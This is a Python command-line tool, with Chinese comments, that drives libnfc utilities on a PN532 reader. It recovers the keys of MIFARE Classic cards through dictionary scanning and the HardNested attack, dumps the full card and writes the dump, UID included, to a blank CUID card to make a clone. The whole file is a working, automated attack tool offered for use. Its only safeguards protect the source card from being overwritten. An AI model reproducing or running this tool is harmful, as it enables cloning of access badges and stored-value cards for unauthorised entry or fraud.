#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""HardNested 一键工具（自动识别串口 / 自动扫密钥 / 实时进度 / 断点续跑）

最常用：
    python hardnested.py auto            # 插上读卡器、放上卡，一条命令搞定
    python hardnested.py auto --dry-run  # 只扫描不破解（看看缺哪些密钥）

其它：
    python hardnested.py crack 5A 7B     # 只破指定扇区
    python hardnested.py verify          # 逐扇区真实认证校验
    python hardnested.py dump            # 读整卡导出 .mfd/.mct
    python hardnested.py status          # 查看上次运行状态

设计要点
  * 串口自动发现：遍历系统 COM 口，用 nfc-list 逐个试，谁有卡用谁（换 USB 口不用改配置）
  * 先用 mfoc 做字典扫描（秒级），只把真正缺的密钥排进 HardNested 队列
  * 每解出一把立刻写 state/keys.json —— 关机/崩溃后重启自动跳过已完成的
  * 计算阶段的百分比在同一窗口原地刷新，不需要另开窗口或截图
  * 明确告知：采样阶段不要拔卡；计算阶段可以拔卡，但别关机/休眠
"""
from __future__ import annotations

import argparse
import json
import platform
import os
import re
import subprocess
import sys
import time
from pathlib import Path

VERSION = "1.0.0"

BASE = Path(__file__).resolve().parent
CONFIG_PATH = BASE / "config.json"
STATE_DIR = BASE / "state"
LOG_DIR = BASE / "logs"
OUT_DIR = BASE / "out"
KEYS_PATH = STATE_DIR / "keys.json"
STATUS_PATH = STATE_DIR / "status.json"

DEFAULT_CONFIG = {
    "nfc_bin": "nfc-bin",
    "port": "",
    "reference_key": "ffffffffffff",
    "reference_block": 36,
    "verify_after_crack": True,
    "max_attempts": 3,
    "dict_scan_seconds": 90,
}

KEY_RE = re.compile(r"\[([0-9a-fA-F]{12})\]")
PCT_RE = re.compile(r"(\d+(?:\.\d+)?)%")
SECTOR_RE = re.compile(r"扇区\s*(\d+)\s*-\s*(.*)")
FOUND_RE = re.compile(r"Key\s*([AB])\s*[:：]\s*([0-9a-fA-F]{12})")


# ---------------------------------------------------------------- 基础
def load_config() -> dict:
    cfg = dict(DEFAULT_CONFIG)
    if CONFIG_PATH.exists():
        try:
            cfg.update(json.loads(CONFIG_PATH.read_text("utf-8-sig")))
        except Exception:
            pass
    else:
        CONFIG_PATH.write_text(json.dumps(cfg, ensure_ascii=False, indent=1), "utf-8")
    # nfc-bin 解析：相对路径按包目录算；绝对路径不存在则回退到包内副本
    nb = Path(cfg["nfc_bin"])
    if not nb.is_absolute():
        nb = BASE / nb
    if not nb.is_dir():
        nb = BASE / "nfc-bin"
    cfg["nfc_bin"] = str(nb)
    return cfg


def save_config(cfg: dict) -> None:
    CONFIG_PATH.write_text(json.dumps(cfg, ensure_ascii=False, indent=1), "utf-8")


class Log:
    def __init__(self, path: Path):
        path.parent.mkdir(parents=True, exist_ok=True)
        self.fh = open(path, "a", encoding="utf-8", buffering=1)
        self.latest = open(path.parent / "latest.log", "a", encoding="utf-8", buffering=1)
        self.path = path
        self._live_len = 0

    def __call__(self, msg: str, raw: bool = False) -> None:
        self.clear_live()
        line = msg if raw else f"[{time.strftime('%H:%M:%S')}] {msg}"
        try:
            print(line, flush=True)
        except Exception:
            pass
        for fh in (self.fh, self.latest):
            fh.write(line + "\n")
            fh.flush()

    def live(self, text: str) -> None:
        """原地刷新的单行进度（计算阶段用）。"""
        try:
            pad = max(0, self._live_len - len(text))
            sys.stdout.write("\r" + text + " " * pad)
            sys.stdout.flush()
            self._live_len = len(text)
        except Exception:
            pass

    def clear_live(self) -> None:
        if self._live_len:
            try:
                sys.stdout.write("\r" + " " * self._live_len + "\r")
                sys.stdout.flush()
            except Exception:
                pass
            self._live_len = 0


def write_status(data: dict) -> None:
    data = dict(data)
    data["updated"] = time.strftime("%Y-%m-%d %H:%M:%S")
    STATUS_PATH.parent.mkdir(parents=True, exist_ok=True)
    STATUS_PATH.write_text(json.dumps(data, ensure_ascii=False, indent=1), "utf-8")


def load_keys() -> dict:
    if not KEYS_PATH.exists():
        return {}
    try:
        raw = json.loads(KEYS_PATH.read_text("utf-8-sig"))
    except Exception:
        return {}
    out = {}
    for k, v in raw.items():
        if isinstance(v, dict):
            out[str(k)] = {"A": v.get("A"), "B": v.get("B")}
        elif isinstance(v, list):
            out[str(k)] = {"A": v[0] if len(v) > 0 else None,
                           "B": v[1] if len(v) > 1 else None}
    return out


def save_key(sec: int, ktype: str, key: str) -> None:
    keys = load_keys()
    row = keys.setdefault(str(sec), {"A": None, "B": None})
    row[ktype] = key.lower()
    STATE_DIR.mkdir(parents=True, exist_ok=True)
    KEYS_PATH.write_text(json.dumps(keys, ensure_ascii=False, indent=1), "utf-8")


def missing_tasks() -> list[str]:
    keys = load_keys()
    out = []
    for s in range(16):
        row = keys.get(str(s), {})
        for kt in ("A", "B"):
            if not row.get(kt):
                out.append(f"{s}{kt}")
    return out


# ---------------------------------------------------------------- 串口与设备
def list_ports() -> list[str]:
    ports = []
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DEVICEMAP\SERIALCOMM") as k:
            i = 0
            while True:
                try:
                    _, val, _ = winreg.EnumValue(k, i)
                    i += 1
                    ports.append(str(val))
                except OSError:
                    break
    except Exception:
        pass
    return sorted(set(ports))


def nfc_env(cfg: dict) -> dict:
    env = dict(os.environ)
    env["LIBNFC_DEVICE"] = f"pn532_uart:{cfg['port']}"
    env["LIBNFC_AUTO_SCAN"] = "false"        # 关键：否则去扫蓝牙串口会卡死
    env["LIBNFC_INTRUSIVE_SCAN"] = "false"
    return env


def run_tool(cfg: dict, exe: str, args: list[str], timeout: int = 30) -> tuple[str, int]:
    try:
        r = subprocess.run([str(Path(cfg["nfc_bin"]) / exe)] + args, cwd=cfg["nfc_bin"],
                           capture_output=True, timeout=timeout, env=nfc_env(cfg))
        return (r.stdout + r.stderr).decode("gbk", errors="replace"), r.returncode
    except subprocess.TimeoutExpired:
        return "", -9
    except Exception as e:
        return str(e), -1


def probe_port(cfg: dict, port: str) -> bool:
    """设备能被打开就算这个口对（卡片在不在由 wait_card 负责等）。"""
    cfg["port"] = port
    txt, _ = run_tool(cfg, "nfc-list.exe", [], timeout=15)
    return ("已打开" in txt) or ("opened" in txt) or ("UID" in txt)


def detect_port(cfg: dict, log: Log) -> str | None:
    ports = list_ports()
    log(f"发现串口: {', '.join(ports) if ports else '(无)'}")
    if cfg.get("port") and probe_port(cfg, cfg["port"]):
        log(f"沿用配置里的串口 {cfg['port']}（设备可打开）")
        return cfg["port"]
    for p in ports:
        log(f"  尝试 {p} …", raw=True)
        if probe_port(cfg, p):
            cfg["port"] = p
            save_config(cfg)
            log(f"✅ 读卡器在 {p}")
            return p
        log(f"  {p} 无响应，跳过")
    return None


def wait_card(cfg: dict, log: Log, minutes: int = 10) -> bool:
    t0 = time.time()
    while time.time() - t0 < minutes * 60:
        txt, _ = run_tool(cfg, "nfc-list.exe", [], timeout=15)
        if "UID" in txt:
            m = re.search(r"UID \(NFCID1\):\s*([0-9a-fA-F ]+)", txt)
            uid = m.group(1).replace(" ", "").upper() if m else "?"
            log(f"✅ 读到卡片 UID={uid}")
            return True
        log("等卡中… 请把卡放到读卡器上")
        time.sleep(5)
    return False


# ---------------------------------------------------------------- 字典扫描
def dict_scan(cfg: dict, log: Log) -> dict:
    """用 mfoc 做默认密钥扫描，解析出哪些扇区已有密钥。"""
    tmp = OUT_DIR / "_scan.mfd"
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    log("开始字典扫描（mfoc 默认密钥表）…")
    proc = subprocess.Popen([str(Path(cfg["nfc_bin"]) / "mfoc.exe"), "-O", str(tmp)],
                            cwd=cfg["nfc_bin"], stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, env=nfc_env(cfg))
    found: dict[int, dict[str, str]] = {}
    t0 = time.time()
    buf = b""
    try:
        while time.time() - t0 < cfg["dict_scan_seconds"]:
            chunk = proc.stdout.read(1)
            if not chunk:
                break
            buf += chunk
            while b"\n" in buf:
                raw, buf = buf.split(b"\n", 1)
                line = raw.decode("gbk", errors="replace").strip()
                m = SECTOR_RE.search(line)
                if m:
                    sec = int(m.group(1))
                    for kt, key in FOUND_RE.findall(m.group(2)):
                        found.setdefault(sec, {})[kt.upper()] = key.lower()
            if "使用扇区" in buf.decode("gbk", errors="replace") or "不受Nested" in buf.decode("gbk", errors="replace"):
                break
    finally:
        proc.kill()
    proc.wait()

    for sec, kv in found.items():
        for kt, key in kv.items():
            save_key(sec, kt, key)
    total = sum(len(v) for v in found.values())
    log(f"字典扫描完成：命中 {total} 把密钥（{len(found)} 个扇区）")
    for sec in sorted(found):
        log(f"  扇区{sec:02d}: " + "  ".join(f"{k}={v.upper()}" for k, v in found[sec].items()))
    return found


# ---------------------------------------------------------------- 破解
def verify_key(cfg: dict, sec: int, ktype: str, key: str) -> bool:
    p = subprocess.Popen([str(Path(cfg["nfc_bin"]) / "libnfc_hardnested.exe"),
                          key, str(sec * 4), ktype, "40", "A"],
                         cwd=cfg["nfc_bin"], stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT, env=nfc_env(cfg))
    time.sleep(9)
    p.kill()
    txt = p.stdout.read().decode("gbk", errors="replace")
    line = next((l for l in txt.splitlines() if "Block" in l), "")
    return "是正确的" in line


def pick_reference(cfg: dict, sec: int) -> tuple[str, int]:
    keys = load_keys()
    for cand in (str(sec), "9", "0", "6", "7", "8"):
        row = keys.get(cand, {})
        if row.get("A"):
            return row["A"], int(cand) * 4
    return cfg["reference_key"], int(cfg["reference_block"])


def crack_one(cfg: dict, log: Log, sec: int, ktype: str) -> str | None:
    block = sec * 4
    ref_key, ref_block = pick_reference(cfg, sec)
    log(f"开始破解 扇区{sec} Key{ktype}（Block {block}，参考 {ref_key}@Block {ref_block}）")
    log("  采样阶段：不要拔卡（约 2~5 分钟），采完自动进入计算")
    t0 = time.time()
    p = subprocess.Popen([str(Path(cfg["nfc_bin"]) / "libnfc_hardnested.exe"),
                          ref_key, str(ref_block), "A", str(block), ktype],
                         cwd=cfg["nfc_bin"], stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT, env=nfc_env(cfg))
    last_mark = -1.0
    for raw in p.stdout:
        line = raw.decode("gbk", errors="replace").rstrip()
        if not line:
            continue
        if LOG_RAW:
            log(line, raw=True)
        if "已计算得目标Key" in line or "已解开的Key" in line:
            m = KEY_RE.search(line)
            if m:
                key = m.group(1).lower()
                p.wait(timeout=120)
                log.clear_live()
                log(f"扇区{sec} Key{ktype} = {key}（用时 {time.time() - t0:.0f}s）")
                return key
        m = PCT_RE.search(line)
        if m:
            pct = float(m.group(1))
            if pct - last_mark >= 1:      # 每 1% 刷新一次屏幕（日志仍全量）
                last_mark = pct
                el = time.time() - t0
                eta = el / pct * (100 - pct) if pct > 1 else 0
                log.live(f"扇区{sec} Key{ktype}  计算 {pct:5.1f}%   已用 {el / 60:4.0f}分   "
                         f"剩余约 {eta / 60:4.0f}分   日志: {log.path.name}")
                write_status({"task": f"{sec}{ktype}", "phase": "计算", "pct": pct,
                              "elapsed_s": round(el), "log": log.path.name})
    p.wait()
    log.clear_live()
    return None


LOG_RAW = True


# ---------------------------------------------------------------- 导出
def dump_card(cfg: dict, log: Log) -> Path | None:
    keys = load_keys()
    if any(not (keys.get(str(s), {}).get("A") and keys.get(str(s), {}).get("B")) for s in range(16)):
        log("密钥不完整，跳过整卡读取（仍可单独跑 dump 试试）")
        return None
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    kmfd = OUT_DIR / "keys_full.mfd"
    d = bytearray(1024)
    for s in range(16):
        row = keys.get(str(s), {})
        off = s * 64 + 48
        d[off:off + 6] = bytes.fromhex(row.get("A") or "ff" * 6)
        d[off + 6:off + 10] = bytes([0xFF, 0x07, 0x80, 0x69])
        d[off + 10:off + 16] = bytes.fromhex(row.get("B") or "ff" * 6)
    kmfd.write_bytes(bytes(d))

    out = OUT_DIR / "card.mfd"
    txt, rc = run_tool(cfg, "nfc-mfclassic.exe",
                       ["r", "a", "u", str(out.resolve()), str(kmfd.resolve()), "f"], timeout=600)
    for l in txt.splitlines():
        log(l, raw=True)
    if not out.exists():
        log("整卡读取失败")
        return None
    data = out.read_bytes()
    lines = ["# MIFARE Classic Tool dump", "# UID=" + data[:4].hex().upper()]
    for s in range(16):
        for b in range(4):
            off = s * 64 + b * 16
            lines.append(f"{s}:{b}  {data[off:off + 16].hex().upper()}")
    (OUT_DIR / "card.mct").write_text("\n".join(lines) + "\n", "utf-8")
    log(f"✅ 已导出 {out.name}（{len(data)} 字节）与 card.mct")
    save_dump_meta(out)
    return out


# ---------------------------------------------------------------- 命令
def new_log(prefix: str) -> Log:
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    return Log(LOG_DIR / f"{prefix}-{time.strftime('%Y%m%d-%H%M%S')}.log")


def cmd_auto(cfg: dict, dry_run: bool = False) -> int:
    log = new_log("auto")
    log(f"=== 一键模式启动（{time.strftime('%Y-%m-%d %H:%M:%S')}）===")
    port = detect_port(cfg, log)
    if not port:
        log("没找到读卡器：确认 PN532 插好、驱动正常。若刚换过 USB 口，等几秒再试。")
        return 2
    if not wait_card(cfg, log):
        log("一直没读到卡片，退出")
        return 2

    dict_scan(cfg, log)
    todo = missing_tasks()
    if not todo:
        log("所有 16 个扇区密钥都已知，不需要破解")
    else:
        log(f"需要破解: {' '.join(todo)}")
    if dry_run:
        log("--dry-run：只扫描不破解，结束")
        return 0

    for t in todo:
        sec, ktype = int(t[:-1]), t[-1]
        for attempt in range(1, int(cfg["max_attempts"]) + 1):
            write_status({"task": t, "phase": "采样", "pct": 0, "log": log.path.name})
            key = crack_one(cfg, log, sec, ktype)
            if key and (not cfg["verify_after_crack"] or verify_key(cfg, sec, ktype, key)):
                save_key(sec, ktype, key)
                log(f"✅ 扇区{sec} Key{ktype} = {key.upper()} 已保存")
                write_status({"task": t, "phase": "完成", "pct": 100, "key": key})
                break
            log(f"第 {attempt} 次未成功，重试（{attempt}/{cfg['max_attempts']}）")
        else:
            log(f"扇区{sec} Key{ktype} 多次失败，跳过")

    dump_card(cfg, log)
    log("=== 全部完成，密钥表 ===")
    keys = load_keys()
    for s in range(16):
        row = keys.get(str(s), {})
        log(f"  扇区{s:02d}: A={(row.get('A') or '????????????').upper()}  "
            f"B={(row.get('B') or '????????????').upper()}")
    write_status({"task": None, "phase": "空闲", "pct": 0})
    return 0


def cmd_crack(cfg: dict, tasks: list[str]) -> int:
    log = new_log("crack")
    log(f"=== 启动：任务 {tasks} 串口 {cfg['port'] or '自动'} ===")
    if not cfg["port"]:
        if not detect_port(cfg, log):
            log("没找到读卡器")
            return 2
    if not wait_card(cfg, log, minutes=5):
        return 2
    for t in tasks:
        sec, ktype = int(t[:-1]), t[-1].upper()
        row = load_keys().get(str(sec), {})
        if row.get(ktype) and verify_key(cfg, sec, ktype, row[ktype]):
            log(f"扇区{sec} Key{ktype} 已完成并验证通过，跳过")
            continue
        key = crack_one(cfg, log, sec, ktype)
        if key and (not cfg["verify_after_crack"] or verify_key(cfg, sec, ktype, key)):
            save_key(sec, ktype, key)
            log(f"✅ 扇区{sec} Key{ktype} = {key.upper()}")
    return 0


def cmd_verify(cfg: dict) -> int:
    log = new_log("verify")
    if not cfg["port"] and not detect_port(cfg, log):
        return 2
    keys = load_keys()
    ok = fail = 0
    for s in range(16):
        row = keys.get(str(s), {})
        for kt in ("A", "B"):
            k = row.get(kt)
            if not k:
                continue
            good = verify_key(cfg, s, kt, k)
            ok, fail = (ok + 1, fail) if good else (ok, fail + 1)
            log(f"扇区{s:02d} Key{kt} {k.upper()} -> {'OK' if good else 'FAIL'}")
    log(f"校验完成：OK {ok}  FAIL {fail}")
    return 0 if fail == 0 else 1


def cmd_dump(cfg: dict) -> int:
    log = new_log("dump")
    if not cfg["port"] and not detect_port(cfg, log):
        return 2
    return 0 if dump_card(cfg, log) else 1


# ---------------------------------------------------------------- 写卡（CUID）
META_PATH = STATE_DIR / "dump_meta.json"


def read_card_uid(cfg: dict) -> str | None:
    txt, _ = run_tool(cfg, "nfc-list.exe", [], timeout=15)
    m = re.search(r"UID \(NFCID1\):\s*([0-9a-fA-F ]+)", txt)
    return m.group(1).replace(" ", "").upper() if m else None


def save_dump_meta(dump_path: Path) -> None:
    import hashlib
    data = dump_path.read_bytes()
    META_PATH.parent.mkdir(parents=True, exist_ok=True)
    META_PATH.write_text(json.dumps({
        "file": dump_path.name,
        "uid": data[:4].hex().upper(),
        "size": len(data),
        "sha256": hashlib.sha256(data).hexdigest(),
        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
    }, ensure_ascii=False, indent=1), "utf-8")


def load_dump_meta() -> dict:
    if META_PATH.exists():
        try:
            return json.loads(META_PATH.read_text("utf-8-sig"))
        except Exception:
            pass
    return {}


def make_keyfile(path: Path, keys: dict) -> Path:
    d = bytearray(1024)
    for s in range(16):
        row = keys.get(str(s), {})
        off = s * 64 + 48
        d[off:off + 6] = bytes.fromhex(row.get("A") or "ff" * 6)
        d[off + 6:off + 10] = bytes([0xFF, 0x07, 0x80, 0x69])
        d[off + 10:off + 16] = bytes.fromhex(row.get("B") or "ff" * 6)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(bytes(d))
    return path


BLANK_KEYS = {str(s): {"A": "ffffffffffff", "B": "ffffffffffff"} for s in range(16)}


def cmd_write(cfg: dict, dump_arg: str | None, assume_yes: bool, allow_same_uid: bool) -> int:
    """把 dump 写进 CUID 卡。三重防护：原卡检测 + 手打确认 + 写前备份。"""
    log = new_log("write")
    dump_path = Path(dump_arg) if dump_arg else (OUT_DIR / "card.mfd")
    if not dump_path.is_absolute():
        dump_path = BASE / dump_path if not (OUT_DIR / dump_path).exists() else OUT_DIR / dump_path
    if not dump_path.exists():
        log(f"找不到 dump 文件：{dump_path}")
        log("先跑 `python hardnested.py dump` 生成 out\\card.mfd")
        return 2
    if dump_path.stat().st_size != 1024:
        log(f"dump 大小不对（{dump_path.stat().st_size} 字节，应为 1024）")
        return 2

    data = dump_path.read_bytes()
    src_uid = data[:4].hex().upper()
    meta = load_dump_meta()
    if meta.get("file") == dump_path.name and meta.get("uid") != src_uid:
        log(f"⚠️ dump 的 UID（{src_uid}）与记录不一致，请确认文件没被替换")

    if not cfg["port"] and not detect_port(cfg, log):
        return 2
    if not wait_card(cfg, log, minutes=3):
        return 2

    tgt_uid = read_card_uid(cfg)
    log(f"dump 里的卡号（源卡）: {src_uid}")
    log(f"当前放在读卡器上的卡 : {tgt_uid}")

    # ---- 防护一：别把数据写回原卡 ----
    if tgt_uid == src_uid and not allow_same_uid:
        log("❌ 拒绝写入：读卡器上是**源卡本身**（UID 相同），写下去会改掉原卡数据。")
        log("   请把读卡器上的卡换成空白 CUID 卡；")
        log("   如果确认这张是同 UID 的克隆卡，加参数 --allow-same-uid 并再次手打确认。")
        return 3

    # ---- 防护二：手打确认 ----
    if not assume_yes:
        print()
        print("=" * 58)
        print(f"即将把 {dump_path.name} 写入读卡器上的卡")
        print(f"  卡片 UID : {tgt_uid}")
        print(f"  写入内容 : {dump_path.stat().st_size} 字节，UID 将改为 {src_uid}")
        print("  ⚠️ 该卡原有数据会被覆盖（写前会自动备份）")
        print("=" * 58)
        try:
            ans = input("输入 “确认写入” 四个字继续，其它任意内容取消： ").strip()
        except EOFError:
            ans = ""
        if ans != "确认写入":
            log("已取消写入")
            return 1

    # ---- 防护三：先备份目标卡，同时判断这张卡用的是哪套密钥 ----
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    backup = OUT_DIR / f"backup_{tgt_uid}.mfd"
    log("正在备份目标卡…")
    write_keys = None
    for kf_name, kf_keys in (("blank", BLANK_KEYS), ("dump", load_keys())):
        kf = make_keyfile(OUT_DIR / f"keys_{kf_name}.mfd", kf_keys)
        backup.unlink(missing_ok=True)
        run_tool(cfg, "nfc-mfclassic.exe",
                 ["r", "a", "u", str(backup.resolve()), str(kf.resolve()), "f"], timeout=300)
        if backup.exists() and backup.stat().st_size == 1024:
            write_keys = kf_keys
            log(f"✅ 已备份到 {backup.name}（这张卡当前用的是 {kf_name} 密钥）")
            break
    if write_keys is None:
        log("⚠️ 备份失败：这张卡的密钥既不是出厂 FFFF，也不是 dump 里的密钥。")
        log("   继续写入很可能失败（认证不过），建议换一张空白 CUID 卡。")
        if not assume_yes:
            if input("仍要继续？输入 y 继续： ").strip().lower() != "y":
                log("已取消")
                return 1
        write_keys = BLANK_KEYS

    # ---- 写入 ----
    log("开始写入…（先写块0改 UID，再逐扇区写数据与密钥）")
    kf = make_keyfile(OUT_DIR / "keys_for_write.mfd", write_keys)
    txt, rc = run_tool(cfg, "nfc-mfclassic.exe",
                       ["w", "a", "u", str(dump_path.resolve()), str(kf.resolve()), "f"], timeout=600)
    for l in txt.splitlines():
        log(l, raw=True)
    bad = [l for l in txt.splitlines() if "错误" in l or "fail" in l.lower()]
    if bad:
        log("写入过程报错：" + bad[0].strip())

    # ---- 回读比对 ----
    log("写入结束，回读校验…")
    verify_path = OUT_DIR / "verify.mfd"
    verify_path.unlink(missing_ok=True)
    kf = make_keyfile(OUT_DIR / "keys_full.mfd", load_keys())
    run_tool(cfg, "nfc-mfclassic.exe",
             ["r", "a", "u", str(verify_path.resolve()), str(kf.resolve()), "f"], timeout=300)
    if not verify_path.exists() or verify_path.stat().st_size != 1024:
        log("❌ 回读失败：写入后无法用目标密钥读出整卡（可能块0写入失败或卡被锁）")
        return 4
    new = verify_path.read_bytes()
    diffs = [i for i in range(1024) if new[i] != data[i]]
    if not diffs:
        log("✅ 回读与 dump 完全一致（1024 字节 0 差异），克隆成功")
        log(f"   新卡 UID = {new[:4].hex().upper()}")
        return 0
    blocks = sorted({d // 16 for d in diffs})
    log(f"⚠️ 有 {len(diffs)} 个字节不一致，涉及块：{blocks[:12]}{' …' if len(blocks) > 12 else ''}")
    log("   常见原因：块0(UID)不可写（这张不是 CUID 卡）/ 尾块控制位不让写")
    return 5


def cmd_selftest(cfg: dict) -> int:
    """环境自检：Python / 二进制 / 串口 / 卡片。出问题时第一个该跑的命令。"""
    ok = True
    print("=" * 58)
    print(f"环境自检 selftest   （版本 {VERSION}）")
    print("-" * 58)
    print(f"Python      : {sys.version.split()[0]} ({platform.architecture()[0]})")
    print(f"包目录      : {BASE}")
    print(f"nfc-bin     : {cfg['nfc_bin']}")

    need = ["libnfc.dll", "libusb0.dll", "nfc-list.exe", "nfc-mfclassic.exe",
            "libnfc_hardnested.exe", "mfoc.exe"]
    nbd = Path(cfg["nfc_bin"])
    missing = [f for f in need if not (nbd / f).exists()]
    if missing:
        ok = False
        print(f"二进制      : 缺 {missing}  ❌")
    else:
        print("二进制      : 齐全 ✅")

    ports = list_ports()
    print(f"系统串口    : {', '.join(ports) if ports else '(无)'}")
    if not ports:
        ok = False
        print("            : 没有串口，检查 USB-TTL 是否插好、驱动是否装了 ❌")
    else:
        port = detect_port(cfg, Log(LOG_DIR / "selftest.log"))
        if not port:
            ok = False
            print("读卡器      : 所有串口都打不开设备 ❌")
            print("              常见原因：CH340 驱动没装 / 串口被别的软件占用 / 换过 USB 口")
        else:
            print(f"读卡器      : {port} ✅")
            txt, _ = run_tool(cfg, "nfc-list.exe", [], timeout=15)
            if "UID" in txt:
                m = re.search(r"UID \(NFCID1\):\s*([0-9a-fA-F ]+)", txt)
                uid = m.group(1).replace(" ", "").upper() if m else "?"
                print(f"卡片        : UID={uid} ✅")
            else:
                print("卡片        : 没读到（把卡贴到读卡器上）⚠️")

    todo = missing_tasks()
    print(f"密钥状态    : {32 - len(todo)}/32 " + (f"缺 {todo}" if todo else "全部齐了"))
    print("-" * 58)
    print("结论        : " + ("环境正常，可以跑 auto" if ok else "有问题，见上面 ❌ 行"))
    print("=" * 58)
    return 0 if ok else 1


def cmd_status(cfg: dict) -> int:
    st = {}
    if STATUS_PATH.exists():
        try:
            st = json.loads(STATUS_PATH.read_text("utf-8"))
        except Exception:
            pass
    print("=" * 58)
    print(f"串口: {cfg['port'] or '(未识别)'}")
    if st:
        print(f"任务: {st.get('task') or '空闲'}   阶段: {st.get('phase', '-')}   进度: {st.get('pct', 0)}%")
        if st.get("key"):
            print(f"最近解出: {st['key']}")
        print(f"状态更新: {st.get('updated')}")
    todo = missing_tasks()
    print(f"密钥: {32 - len(todo)}/32 项已知" + (f"，待破解 {todo}" if todo else "，全部齐了"))
    lg = LOG_DIR / "latest.log"
    if lg.exists():
        tail = [l for l in lg.read_text("utf-8", errors="replace").splitlines() if l.strip()][-3:]
        if tail:
            print("最近日志:")
            for l in tail:
                print("   " + l.strip()[:110])
    print("=" * 58)
    return 0


def main(argv: list[str]) -> int:
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass
    cfg = load_config()
    ap = argparse.ArgumentParser(description="HardNested 一键工具")
    ap.add_argument("--port", default=cfg.get("port", ""), help="串口，如 COM13；不填自动探测")
    ap.add_argument("--quiet", action="store_true", help="日志里不写子进程每一行")
    ap.add_argument("--version", action="version", version=f"hardnested {VERSION}")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("auto", help="一键：找读卡器→扫密钥→破解→导出")
    p.add_argument("--dry-run", action="store_true", help="只扫描不破解")

    p = sub.add_parser("crack", help="破解指定扇区，如 5A 7B")
    p.add_argument("tasks", nargs="+")

    sub.add_parser("verify", help="逐扇区校验")
    sub.add_parser("dump", help="读整卡导出")
    pw = sub.add_parser("write", help="一键写 CUID 卡（带原卡检测与确认）")
    pw.add_argument("--dump", default=None, help="要写入的 dump，默认 out\\card.mfd")
    pw.add_argument("--yes", action="store_true", help="跳过手打确认（脚本用，谨慎）")
    pw.add_argument("--allow-same-uid", action="store_true",
                    help="允许写入与源卡同 UID 的卡（用于重写克隆卡）")
    sub.add_parser("status", help="查看状态")
    sub.add_parser("selftest", help="环境自检（排错第一步）")

    a = ap.parse_args(argv)
    cfg["port"] = a.port or cfg.get("port", "")
    global LOG_RAW
    LOG_RAW = not a.quiet
    if a.cmd == "auto":
        return cmd_auto(cfg, a.dry_run)
    if a.cmd == "crack":
        return cmd_crack(cfg, a.tasks)
    if a.cmd == "verify":
        return cmd_verify(cfg)
    if a.cmd == "dump":
        return cmd_dump(cfg)
    if a.cmd == "write":
        return cmd_write(cfg, a.dump, a.yes, a.allow_same_uid)
    if a.cmd == "status":
        return cmd_status(cfg)
    if a.cmd == "selftest":
        return cmd_selftest(cfg)
    return 2


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
